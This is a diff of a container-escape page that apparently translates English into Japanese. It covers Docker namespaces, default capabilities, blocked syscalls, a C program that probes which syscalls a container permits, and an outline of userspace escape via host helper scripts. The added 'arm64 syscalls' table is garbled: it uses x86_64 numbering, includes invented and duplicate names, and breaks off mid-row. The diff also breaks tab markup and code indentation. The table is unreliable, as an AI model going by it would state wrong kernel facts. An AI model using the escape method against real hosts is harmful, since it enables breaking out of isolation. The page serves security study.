-There are other CVEs the container can be vulnerable too, you can find a list in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
+コンテナは他のCVEにも脆弱である可能性があります。リストは[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)で確認できます。
 {% endhint %}
 
-## Docker Custom Escape
+## Dockerカスタムエスケープ
 
-### Docker Escape Surface
+### Dockerエスケープの対象
 
-* **Namespaces:** The process should be **completely separated from other processes** via namespaces, so we cannot escape interacting with other procs due to namespaces (by default cannot communicate via IPCs, unix sockets, network svcs, D-Bus, `/proc` of other procs).
-* **Root user**: By default the user running the process is the root user (however its privileges are limited).
-* **Capabilities**: Docker leaves the following capabilities: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscalls**: These are the syscalls that the **root user won't be able to call** (because of lacking capabilities + Seccomp). The other syscalls could be used to try to escape.
+* **ネームスペース**：ネームスペースによって、プロセスは他のプロセスと完全に分離されるため、ネームスペースによる他のプロセスとのやり取りから脱出することはできません（デフォルトでは、IPCs、UNIXソケット、ネットワークサービス、D-Bus、他のプロセスの`/proc`を介した通信はできません）。
+* **ルートユーザー**：デフォルトでは、プロセスを実行するユーザーはルートユーザーです（ただし、権限は制限されています）。
+* **機能**：Dockerは次の機能を残します：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+* **シスコール**：これらはルートユーザーが呼び出せないシスコールです（機能の不足+Seccompのため）。他のシスコールを使用して脱出を試みることができます。
 
 {% tabs %}
 {% tab title="x64 syscalls" %}
@@ -583,9 +534,417 @@ There are other CVEs the container can be vulnerable too, you can find a list in
 0x140 -- kexec_file_load
 0x141 -- bpf
 ```
-{% endtab %}
-
 {% tab title="arm64 syscalls" %}
+
+以下は、arm64アーキテクチャで使用されるシステムコールの一覧です。
+
+| システムコール番号 | システムコール名 |
+|-------------------|-----------------|
+| 0                 | read            |
+| 1                 | write           |
+| 2                 | open            |
+| 3                 | close           |
+| 4                 | stat            |
+| 5                 | fstat           |
+| 6                 | lstat           |
+| 7                 | poll            |
+| 8                 | lseek           |
+| 9                 | mmap            |
+| 10                | mprotect        |
+| 11                | munmap          |
+| 12                | brk             |
+| 13                | rt_sigaction    |
+| 14                | rt_sigprocmask  |
+| 15                | rt_sigreturn    |
+| 16                | ioctl           |
+| 17                | pread64         |
+| 18                | pwrite64        |
+| 19                | readv           |
+| 20                | writev          |
+| 21                | access          |
+| 22                | pipe            |
+| 23                | select          |
+| 24                | sched_yield     |
+| 25                | mremap          |
+| 26                | msync           |
+| 27                | mincore         |
+| 28                | madvise         |
+| 29                | shmget          |
+| 30                | shmat           |
+| 31                | shmctl          |
+| 32                | dup             |
+| 33                | dup2            |
+| 34                | pause           |
+| 35                | nanosleep       |
+| 36                | getitimer       |
+| 37                | alarm           |
+| 38                | setitimer       |
+| 39                | getpid          |
+| 40                | sendfile        |
+| 41                | socket          |
+| 42                | connect         |
+| 43                | accept          |
+| 44                | sendto          |
+| 45                | recvfrom        |
+| 46                | sendmsg         |
+| 47                | recvmsg         |
+| 48                | shutdown        |
+| 49                | bind            |
+| 50                | listen          |
+| 51                | getsockname     |
+| 52                | getpeername     |
+| 53                | socketpair      |
+| 54                | setsockopt      |
+| 55                | getsockopt      |
+| 56                | clone           |
+| 57                | fork            |
+| 58                | vfork           |
+| 59                | execve          |
+| 60                | exit            |
+| 61                | wait4           |
+| 62                | kill            |
+| 63                | uname           |
+| 64                | semget          |
+| 65                | semop           |
+| 66                | semctl          |
+| 67                | shmdt           |
+| 68                | msgget          |
+| 69                | msgsnd          |
+| 70                | msgrcv          |
+| 71                | msgctl          |
+| 72                | fcntl           |
+| 73                | flock           |
+| 74                | fsync           |
+| 75                | fdatasync       |
+| 76                | truncate        |
+| 77                | ftruncate       |
+| 78                | getdents        |
+| 79                | getcwd          |
+| 80                | chdir           |
+| 81                | fchdir          |
+| 82                | rename          |
+| 83                | mkdir           |
+| 84                | rmdir           |
+| 85                | creat           |
+| 86                | link            |
+| 87                | unlink          |
+| 88                | symlink         |
+| 89                | readlink        |
+| 90                | chmod           |
+| 91                | fchmod          |
+| 92                | chown           |
+| 93                | fchown          |
+| 94                | lchown          |
+| 95                | umask           |
+| 96                | gettimeofday   |
+| 97                | getrlimit       |
+| 98                | getrusage       |
+| 99                | sysinfo         |
+| 100               | times           |
+| 101               | ptrace          |
+| 102               | getuid          |
+| 103               | syslog          |
+| 104               | getgid          |
+| 105               | setuid          |
+| 106               | setgid          |
+| 107               | geteuid         |
+| 108               | getegid         |
+| 109               | setpgid         |
+| 110               | getppid         |
+| 111               | getpgrp         |
+| 112               | setsid          |
+| 113               | setreuid        |
+| 114               | setregid        |
+| 115               | getgroups       |
+| 116               | setgroups       |
+| 117               | setresuid       |
+| 118               | getresuid       |
+| 119               | setresgid       |
+| 120               | getresgid       |
+| 121               | getpgid         |
+| 122               | setfsuid        |
+| 123               | setfsgid        |
+| 124               | getsid          |
+| 125               | capget          |
+| 126               | capset          |
+| 127               | rt_sigpending   |
+| 128               | rt_sigtimedwait |
+| 129               | rt_sigqueueinfo |
+| 130               | rt_sigsuspend   |
+| 131               | sigaltstack     |
+| 132               | utime           |
+| 133               | mknod           |
+| 134               | uselib          |
+| 135               | personality     |
+| 136               | ustat           |
+| 137               | statfs          |
+| 138               | fstatfs         |
+| 139               | sysfs           |
+| 140               | getpriority     |
+| 141               | setpriority     |
+| 142               | sched_setparam  |
+| 143               | sched_getparam  |
+| 144               | sched_setscheduler |
+| 145               | sched_getscheduler |
+| 146               | sched_get_priority_max |
+| 147               | sched_get_priority_min |
+| 148               | sched_rr_get_interval |
+| 149               | mlock           |
+| 150               | munlock         |
+| 151               | mlockall        |
+| 152               | munlockall      |
+| 153               | vhangup         |
+| 154               | modify_ldt      |
+| 155               | pivot_root      |
+| 156               | _sysctl         |
+| 157               | prctl           |
+| 158               | arch_prctl      |
+| 159               | adjtimex        |
+| 160               | setrlimit       |
+| 161               | chroot          |
+| 162               | sync            |
+| 163               | acct            |
+| 164               | settimeofday   |
+| 165               | mount           |
+| 166               | umount2         |
+| 167               | swapon          |
+| 168               | swapoff         |
+| 169               | reboot          |
+| 170               | sethostname     |
+| 171               | setdomainname   |
+| 172               | iopl            |
+| 173               | ioperm          |
+| 174               | create_module   |
+| 175               | init_module     |
+| 176               | delete_module   |
+| 177               | get_kernel_syms |
+| 178               | query_module    |
+| 179               | quotactl        |
+| 180               | nfsservctl      |
+| 181               | getpmsg         |
+| 182               | putpmsg         |
+| 183               | afs_syscall     |
+| 184               | tuxcall         |
+| 185               | security        |
+| 186               | gettid          |
+| 187               | readahead       |
+| 188               | setxattr        |
+| 189               | lsetxattr       |
+| 190               | fsetxattr       |
+| 191               | getxattr        |
+| 192               | lgetxattr       |
+| 193               | fgetxattr       |
+| 194               | listxattr       |
+| 195               | llistxattr      |
+| 196               | flistxattr      |
+| 197               | removexattr     |
+| 198               | lremovexattr    |
+| 199               | fremovexattr    |
+| 200               | tkill           |
+| 201               | time            |
+| 202               | futex           |
+| 203               | sched_setaffinity |
+| 204               | sched_getaffinity |
+| 205               | set_thread_area |
+| 206               | io_setup        |
+| 207               | io_destroy      |
+| 208               | io_getevents    |
+| 209               | io_submit       |
+| 210               | io_cancel       |
+| 211               | get_thread_area |
+| 212               | lookup_dcookie  |
+| 213               | epoll_create    |
+| 214               | epoll_ctl_old   |
+| 215               | epoll_wait_old  |
+| 216               | remap_file_pages |
+| 217               | getdents64      |
+| 218               | set_tid_address |
+| 219               | restart_syscall |
+| 220               | semtimedop      |
+| 221               | fadvise64       |
+| 222               | timer_create    |
+| 223               | timer_settime   |
+| 224               | timer_gettime   |
+| 225               | timer_getoverrun |
+| 226               | timer_delete    |
+| 227               | clock_settime   |
+| 228               | clock_gettime   |
+| 229               | clock_getres    |
+| 230               | clock_nanosleep |
+| 231               | exit_group      |
+| 232               | epoll_wait      |
+| 233               | epoll_ctl       |
+| 234               | tgkill          |
+| 235               | utimes          |
+| 236               | vserver         |
+| 237               | mbind           |
+| 238               | set_mempolicy   |
+| 239               | get_mempolicy   |
+| 240               | mq_open         |
+| 241               | mq_unlink       |
+| 242               | mq_timedsend    |
+| 243               | mq_timedreceive |
+| 244               | mq_notify       |
+| 245               | mq_getsetattr   |
+| 246               | kexec_load      |
+| 247               | waitid          |
+| 248               | add_key         |
+| 249               | request_key     |
+| 250               | keyctl          |
+| 251               | ioprio_set      |
+| 252               | ioprio_get      |
+| 253               | inotify_init    |
+| 254               | inotify_add_watch |
+| 255               | inotify_rm_watch |
+| 256               | migrate_pages   |
+| 257               | openat          |
+| 258               | mkdirat         |
+| 259               | mknodat         |
+| 260               | fchownat        |
+| 261               | futimesat       |
+| 262               | newfstatat      |
+| 263               | unlinkat        |
+| 264               | renameat        |
+| 265               | linkat          |
+| 266               | symlinkat       |
+| 267               | readlinkat      |
+| 268               | fchmodat        |
+| 269               | faccessat       |
+| 270               | pselect6        |
+| 271               | ppoll           |
+| 272               | unshare         |
+| 273               | set_robust_list |
+| 274               | get_robust_list |
+| 275               | splice          |
+| 276               | tee             |
+| 277               | sync_file_range |
+| 278               | vmsplice        |
+| 279               | move_pages      |
+| 280               | utimensat       |
+| 281               | epoll_pwait     |
+| 282               | signalfd        |
+| 283               | timerfd_create  |
+| 284               | eventfd         |
+| 285               | fallocate       |
+| 286               | timerfd_settime |
+| 287               | timerfd_gettime |
+| 288               | accept4         |
+| 289               | signalfd4       |
+| 290               | eventfd2        |
+| 291               | epoll_create1   |
+| 292               | dup3            |
+| 293               | pipe2           |
+| 294               | inotify_init1   |
+| 295               | preadv          |
+| 296               | pwritev         |
+| 297               | rt_tgsigqueueinfo |
+| 298               | perf_event_open |
+| 299               | recvmmsg        |
+| 300               | fanotify_init   |
+| 301               | fanotify_mark   |
+| 302               | prlimit64       |
+| 303               | name_to_handle_at |
+| 304               | open_by_handle_at |
+| 305               | clock_adjtime   |
+| 306               | syncfs          |
+| 307               | sendmmsg        |
+| 308               | setns           |
+| 309               | getcpu          |
+| 310               | process_vm_readv |
+| 311               | process_vm_writev |
+| 312               | kcmp            |
+| 313               | finit_module    |
+| 314               | sched_setattr   |
+| 315               | sched_getattr   |
+| 316               | renameat2       |
+| 317               | seccomp         |
+| 318               | getrandom       |
+| 319               | memfd_create    |
+| 320               | kexec_file_load |
+| 321               | bpf             |
+| 322               | execveat        |
+| 323               | userfaultfd     |
+| 324               | membarrier      |
+| 325               | mlock2          |
+| 326               | copy_file_range |
+| 327               | preadv2         |
+| 328               | pwritev2        |
+| 329               | pkey_mprotect   |
+| 330               | pkey_alloc      |
+| 331               | pkey_free       |
+| 332               | statx           |
+| 333               | io_pgetevents   |
+| 334               | rseq            |
+| 424               | pidfd_send_signal |
+| 425               | io_uring_setup  |
+| 426               | io_uring_enter  |
+| 427               | io_uring_register |
+| 428               | open_tree       |
+| 429               | move_mount      |
+| 430               | fsopen          |
+| 431               | fsconfig        |
+| 432               | fsmount         |
+| 433               | fspick          |
+| 434               | pidfd_open      |
+| 435               | clone3          |
+| 436               | close_range     |
+| 437               | openat2         |
+| 438               | pidfd_getfd     |
+| 439               | faccessat2      |
+| 440               | process_madvise |
+| 512               | rt_sigaction    |
+| 513               | rt_sigreturn    |
+| 514               | ioctl           |
+| 515               | readv           |
+| 516               | writev          |
+| 517               | recvfrom        |
+| 518               | sendmsg         |
+| 519               | recvmsg         |
+| 520               | execveat        |
+| 521               | membarrier      |
+| 522               | userfaultfd     |
+| 523               | copy_file_range |
+| 524               | preadv2         |
+| 525               | pwritev2        |
+| 526               | pkey_mprotect   |
+| 527               | pkey_alloc      |
+| 528               | pkey_free       |
+| 529               | statx           |
+| 530               | io_pgetevents   |
+| 531               | rseq            |
+| 532               | pidfd_send_signal |
+| 533               | io_uring_setup  |
+| 534               | io_uring_enter  |
+| 535               | io_uring_register |
+| 536               | open_tree       |
+| 537               | move_mount      |
+| 538               | fsopen          |
+| 539               | fsconfig        |
+| 540               | fsmount         |
+| 541               | fspick          |
+| 542               | pidfd_open      |
+| 543               | clone3          |
+| 544               | close_range     |
+| 545               | openat2         |
+| 546               | pidfd_getfd     |
+| 547               | faccessat2      |
+| 548               | process_madvise |
+| 549               | epoll_pwait2    |
+| 550               | mount_setattr   |
+| 551               | quotactl_fd     |
+| 552               | landlock_create_ruleset |
+| 553               | landlock_add_rule |
+| 554               | landlock_restrict_self |
+| 555               | memfd_secret    |
+| 556               | process_mrelease |
+| 557               | pwritevf        |
+| 558               | preadvf         |
+| 559               | fallocate64     |
+| 560               | fgetxattr       |
+| 561               | lgetxattr       |
+| 562               | fsetxattr       |
+| 563               | lsetxattr       |
+| 564               |
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -603,8 +962,6 @@ There are other CVEs the container can be vulnerable too, you can find a list in
 0x111 -- finit_module
 0x118 -- bpf
 ```
-{% endtab %}
-
 {% tab title="syscall_bf.c" %}
 ````c
 // From a conversation I had with @arget131
@@ -617,31 +974,32 @@ There are other CVEs the container can be vulnerable too, you can find a list in
 
 int main()
 {
-    for(int i = 0; i < 333; ++i)
-    {
-        if(i == SYS_rt_sigreturn) continue;
-        if(i == SYS_select) continue;
-        if(i == SYS_pause) continue;
-        if(i == SYS_exit_group) continue;
-        if(i == SYS_exit) continue;
-        if(i == SYS_clone) continue;
-        if(i == SYS_fork) continue;
-        if(i == SYS_vfork) continue;
-        if(i == SYS_pselect6) continue;
-        if(i == SYS_ppoll) continue;
-        if(i == SYS_seccomp) continue;
-        if(i == SYS_vhangup) continue;
-        if(i == SYS_reboot) continue;
-        if(i == SYS_shutdown) continue;
-        if(i == SYS_msgrcv) continue;
-        printf("Probando: 0x%03x . . . ", i); fflush(stdout);
-        if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
-            printf("Error\n");
-        else
-            printf("OK\n");
-    }
+for(int i = 0; i < 333; ++i)
+{
+if(i == SYS_rt_sigreturn) continue;
+if(i == SYS_select) continue;
+if(i == SYS_pause) continue;
+if(i == SYS_exit_group) continue;
+if(i == SYS_exit) continue;
+if(i == SYS_clone) continue;
+if(i == SYS_fork) continue;
+if(i == SYS_vfork) continue;
+if(i == SYS_pselect6) continue;
+if(i == SYS_ppoll) continue;
+if(i == SYS_seccomp) continue;
+if(i == SYS_vhangup) continue;
+if(i == SYS_reboot) continue;
+if(i == SYS_shutdown) continue;
+if(i == SYS_msgrcv) continue;
+printf("Probando: 0x%03x . . . ", i); fflush(stdout);
+if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
+printf("Error\n");
+else
+printf("OK\n");
+}
 }
 ```
+
 ````
 {% endtab %}
 {% endtabs %}
@@ -651,12 +1009,12 @@ int main()
 If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):
 
 * Find the **path of the containers filesystem** inside the host
-  * You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
+* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
 * Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
-  * You should be able to **execute the trigger from inside the host**
-  * You need to know where the containers files are located inside the host to indicate a script you write inside the host
+* You should be able to **execute the trigger from inside the host**
+* You need to know where the containers files are located inside the host to indicate a script you write inside the host
 * Have **enough capabilities and disabled protections** to be able to abuse that functionality
-  * You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container
+* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container
 
 ## References
 
